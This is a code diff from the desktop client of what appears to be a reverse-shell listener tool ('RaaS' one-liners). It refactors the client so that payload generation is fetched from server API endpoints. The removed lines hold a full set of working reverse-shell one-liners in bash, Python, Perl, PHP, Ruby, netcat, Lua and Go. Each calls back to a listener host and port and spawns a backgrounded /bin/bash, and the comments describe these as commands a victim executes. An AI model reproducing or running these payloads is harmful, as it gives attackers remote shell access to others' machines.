@@ -79,46 +79,52 @@ func (a *App) DeleteListener(hash string) error {
 	return err
 }
 
-// raasTemplates mirrors internal/utils/raas/templates/*.tpl on the server.
-// Kept inline here so the desktop module doesn't need a cross-module
-// dependency on the server source. Update both if the server templates change.
-var raasTemplates = map[string]string{
-	"bash":    `/usr/bin/nohup /bin/bash -c '/bin/bash -i >/dev/tcp/__HOST__/__PORT__ 0>&1 &' >/dev/null`,
-	"python":  `/usr/bin/nohup /bin/bash -c 'python -c '\''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("__HOST__",__PORT__));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);import os; os.system("/bin/bash")'\'' &' >/dev/null`,
-	"python2": `/usr/bin/nohup /bin/bash -c 'python2 -c '\''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("__HOST__",__PORT__));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);import os; os.system("/bin/bash")'\'' &' >/dev/null`,
-	"python3": `/usr/bin/nohup /bin/bash -c 'python3 -c '\''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("__HOST__",__PORT__));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);import os; os.system("/bin/bash")'\'' &' >/dev/null`,
-	"perl":    `/usr/bin/nohup /bin/bash -c 'perl -e '\''use Socket;$i="__HOST__";$p=__PORT__;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");system("/bin/bash -i");};'\'' &' >/dev/null`,
-	"php":     `/usr/bin/nohup /bin/bash -c 'php -r '\''$sock=fsockopen("__HOST__",__PORT__);shell_exec("/bin/bash -i <&3 >&3");'\'' &' >/dev/null`,
-	"ruby":    `/usr/bin/nohup /bin/bash -c "ruby -rsocket -e 'exec(\"/bin/bash\",\"-c\",\"/bin/bash -i >/dev/tcp/__HOST__/__PORT__ 0>&1\");' &" >/dev/null`,
-	"nc":      `/usr/bin/nohup /bin/bash -c "mkfifo /tmp/.platypus;nc __HOST__ __PORT__ 0</tmp/.platypus | /bin/bash | tee /tmp/.platypus &" >/dev/null`,
-	"lua":     `/usr/bin/nohup /bin/bash -c 'lua -e "require('\''socket'\'').connect('\''__HOST__'\'','\''__PORT__'\'');require('\''os'\'').execute('\''/bin/bash -i <&3 >&3'\'');" &' >/dev/null`,
-	"go":      `/usr/bin/nohup /bin/bash -c "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"__HOST__:__PORT__\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/platypus.go && go run /tmp/platypus.go && rm /tmp/platypus.go &" >/dev/null`,
-}
-
-// AvailableRaasLanguages returns the language keys (sorted) the
-// frontend can pass to GenerateRaasOneliner.
-func (a *App) AvailableRaasLanguages() []string {
-	out := make([]string, 0, len(raasTemplates))
-	for k := range raasTemplates {
-		out = append(out, k)
+// AvailableRaasLanguages asks the server which one-liner languages it
+// can render. Backed by GET /api/v1/raas/languages.
+func (a *App) AvailableRaasLanguages() ([]string, error) {
+	c, err := a.client()
+	if err != nil {
+		return nil, err
 	}
-	sort.Strings(out)
-	return out
+	body, err := c.Get(context.Background(), "/api/v1/raas/languages", nil)
+	if err != nil {
+		return nil, err
+	}
+	var resp struct {
+		Languages []string `json:"languages"`
+	}
+	if err := json.Unmarshal(body, &resp); err != nil {
+		return nil, fmt.Errorf("parse languages: %w", err)
+	}
+	sort.Strings(resp.Languages)
+	return resp.Languages, nil
 }
 
-// GenerateRaasOneliner builds the one-line shell command the victim
-// executes to call back to the listener. listenerHostPort should be
-// "host:port" (e.g. "1.2.3.4:13337"). Unknown languages fall back to bash.
-func (a *App) GenerateRaasOneliner(listenerHostPort, lang string) string {
+// GenerateRaasOneliner returns the shell command a victim should execute
+// to call back to `listenerHostPort` (e.g. "1.2.3.4:13337"). Backed by
+// GET /api/v1/raas/oneliner — the server is the single source of truth
+// for every template, so changes land in one place.
+func (a *App) GenerateRaasOneliner(listenerHostPort, lang string) (string, error) {
+	c, err := a.client()
+	if err != nil {
+		return "", err
+	}
 	host, port := splitHostPort(listenerHostPort)
-
-	tpl, ok := raasTemplates[lang]
-	if !ok {
-		tpl = raasTemplates["bash"]
+	q := url.Values{}
+	q.Set("host", host)
+	q.Set("port", port)
+	q.Set("lang", lang)
+	body, err := c.Get(context.Background(), "/api/v1/raas/oneliner", q)
+	if err != nil {
+		return "", err
 	}
-	out := strings.ReplaceAll(tpl, "__HOST__", host)
-	out = strings.ReplaceAll(out, "__PORT__", port)
-	return out
+	var resp struct {
+		Oneliner string `json:"oneliner"`
+	}
+	if err := json.Unmarshal(body, &resp); err != nil {
+		return "", fmt.Errorf("parse oneliner: %w", err)
+	}
+	return resp.Oneliner, nil
 }
 
 // splitHostPort splits "h:p" into host and port; returns sensible defaults
